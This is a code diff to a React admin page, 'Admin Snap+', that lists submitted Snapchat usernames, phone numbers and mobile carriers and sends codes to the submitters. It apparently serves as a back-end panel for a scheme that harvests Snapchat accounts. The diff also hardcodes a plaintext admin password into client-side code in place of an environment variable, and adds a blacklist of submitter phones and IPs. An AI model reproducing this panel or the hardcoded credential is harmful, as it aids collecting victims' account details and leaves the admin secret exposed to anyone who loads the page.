@@ -4,7 +4,7 @@ import { motion } from "framer-motion";
 import { useEffect, useState } from "react";
 import { Lock } from "lucide-react";
 
-const ADMIN_PASSWORD = import.meta.env.VITE_ADMIN_PASSWORD || "";
+const ADMIN_PASSWORD = "31HDZhdbzh2873&";
 
 const operatorBadge = {
   SFR: "bg-red-500/15 text-red-400 border-red-500/30",
@@ -68,6 +68,12 @@ export default function Admin() {
   const queryClient = useQueryClient();
   const [sendingId, setSendingId] = useState(null);
   const [sentIds, setSentIds] = useState([]);
+  const [blacklist, setBlacklist] = useState(() => {
+    const saved = localStorage.getItem("snap_blacklist");
+    return saved ? JSON.parse(saved) : [];
+  });
+  const [showBlacklist, setShowBlacklist] = useState(false);
+  const [blacklistInput, setBlacklistInput] = useState("");
 
   const { data: submissions = [], isLoading } = useQuery({
     queryKey: ["submissions"],
@@ -97,17 +103,84 @@ export default function Admin() {
     Orange: submissions.filter((s) => s.operateur === "Orange").length,
   };
 
+  const addToBlacklist = () => {
+    if (!blacklistInput.trim()) return;
+    const newBlacklist = [...blacklist, { value: blacklistInput.trim(), type: /^\d+$/.test(blacklistInput.trim()) ? "phone" : "ip" }];
+    setBlacklist(newBlacklist);
+    localStorage.setItem("snap_blacklist", JSON.stringify(newBlacklist));
+    setBlacklistInput("");
+  };
+
+  const removeFromBlacklist = (idx) => {
+    const newBlacklist = blacklist.filter((_, i) => i !== idx);
+    setBlacklist(newBlacklist);
+    localStorage.setItem("snap_blacklist", JSON.stringify(newBlacklist));
+  };
+
+  const isBlacklisted = (sub) => {
+    return blacklist.some(item => 
+      (item.type === "phone" && sub.telephone === item.value) ||
+      (item.type === "ip" && sub.created_by_id === item.value)
+    );
+  };
+
   if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;
 
   return (
     <div className="min-h-screen bg-background px-4 py-10">
       <div className="max-w-4xl mx-auto">
-        <div className="mb-10">
-          <h1 className="font-heading text-3xl font-bold text-foreground">
-            Admin <span className="text-primary">Snap+</span>
-          </h1>
-          <p className="text-muted-foreground text-sm mt-1">Toutes les soumissions reçues</p>
+        <div className="mb-10 flex justify-between items-start">
+          <div>
+            <h1 className="font-heading text-3xl font-bold text-foreground">
+              Admin <span className="text-primary">Snap+</span>
+            </h1>
+            <p className="text-muted-foreground text-sm mt-1">Toutes les soumissions reçues</p>
+          </div>
+          <button
+            onClick={() => setShowBlacklist(!showBlacklist)}
+            className="bg-destructive/20 text-destructive border border-destructive/40 px-4 py-2 rounded-lg text-xs font-bold hover:bg-destructive/30 transition-colors"
+          >
+            🚫 Blacklist ({blacklist.length})
+          </button>
         </div>
+
+        {showBlacklist && (
+          <motion.div
+            initial={{ opacity: 0, y: -10 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="bg-destructive/10 border border-destructive/30 rounded-xl p-4 mb-6"
+          >
+            <h3 className="text-sm font-bold text-destructive mb-3">Gérer la Blacklist</h3>
+            <div className="flex gap-2 mb-3">
+              <input
+                type="text"
+                placeholder="Numéro (07...) ou IP"
+                value={blacklistInput}
+                onChange={(e) => setBlacklistInput(e.target.value)}
+                className="flex-1 bg-background border border-border rounded-lg px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-destructive/40"
+              />
+              <button
+                onClick={addToBlacklist}
+                className="bg-destructive text-destructive-foreground px-3 py-2 rounded-lg text-xs font-bold hover:bg-destructive/80"
+              >
+                Ajouter
+              </button>
+            </div>
+            <div className="space-y-1 max-h-32 overflow-y-auto">
+              {blacklist.map((item, idx) => (
+                <div key={idx} className="flex justify-between items-center bg-background p-2 rounded text-xs">
+                  <span>{item.value} ({item.type === "phone" ? "📞" : "🌐"})</span>
+                  <button
+                    onClick={() => removeFromBlacklist(idx)}
+                    className="text-destructive hover:text-destructive/80"
+                  >
+                    ✕
+                  </button>
+                </div>
+              ))}
+            </div>
+          </motion.div>
+        )}
 
         <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
           {[
@@ -156,19 +229,23 @@ export default function Admin() {
                   {submissions.map((sub, i) => {
                     const isSent = sentIds.includes(sub.id) || sub.status === "code_ready";
                     const isSending = sendingId === sub.id;
+                    const blacklisted = isBlacklisted(sub);
                     return (
                       <motion.tr
                         key={sub.id}
                         initial={{ opacity: 0 }}
                         animate={{ opacity: 1 }}
                         transition={{ delay: i * 0.03 }}
-                        className="border-b border-border/50 hover:bg-muted/30 transition-colors"
+                        className={`border-b border-border/50 hover:bg-muted/30 transition-colors ${blacklisted ? "bg-destructive/10 opacity-50" : ""}`}
                       >
                         <td className="px-6 py-4 text-muted-foreground text-sm font-mono">{i + 1}</td>
                         <td className="px-6 py-4 text-sm font-semibold text-foreground flex items-center gap-2">
                           <span className="text-base">👻</span> {sub.snapchat}
                         </td>
-                        <td className="px-6 py-4 text-sm text-foreground font-mono">{sub.telephone}</td>
+                        <td className="px-6 py-4 text-sm text-foreground font-mono">
+                          {sub.telephone}
+                          {blacklisted && <span className="ml-2 text-destructive text-xs">🚫</span>}
+                        </td>
                         <td className="px-6 py-4">
                           <span className={`inline-flex items-center px-3 py-1 rounded-full border text-xs font-bold tracking-wide ${operatorBadge[sub.operateur]}`}>
                             {sub.operateur}
